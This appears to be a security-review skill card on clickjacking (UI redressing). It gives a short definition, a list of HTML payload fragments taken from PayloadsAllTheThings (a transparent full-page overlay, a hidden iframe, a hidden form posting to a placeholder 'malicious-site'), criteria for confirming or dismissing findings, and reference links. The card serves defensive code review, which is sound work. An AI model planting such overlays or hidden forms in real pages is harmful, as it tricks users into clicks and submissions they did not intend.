# Clickjacking — @framer skill
> cats: (advisory — no static taint rule yet) · severity: medium
> sources: PayloadsAllTheThings, HackTricks

## What it is
UI Redressing is a Clickjacking technique where an attacker overlays a transparent UI element on top of a legitimate website or application.

## Exploit payloads (from PayloadsAllTheThings)
- `<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">`
- `<a href="malicious-link">Click me</a>`
- `</div>`
- `<iframe src="malicious-site" style="opacity: 0; height: 0; width: 0; border: none;"></iframe>`
- `<button onclick="submitForm()">Click me</button>`
- `<form action="malicious-site" method="POST" id="hidden-form" style="display: none;">`
- `<!-- Hidden form fields -->`
- `</form>`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=Clickjacking
- HackTricks Cloud: https://cloud.hacktricks.wiki/

## HackTricks pages (2)

- [BrowExt - ClickJacking](https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/browext-clickjacking)
- [Clickjacking](https://hacktricks.wiki/en/pentesting-web/clickjacking)

## References
- HackTricks: https://hacktricks.wiki/en/
- HackTricks repo: https://github.com/HackTricks-wiki/hacktricks
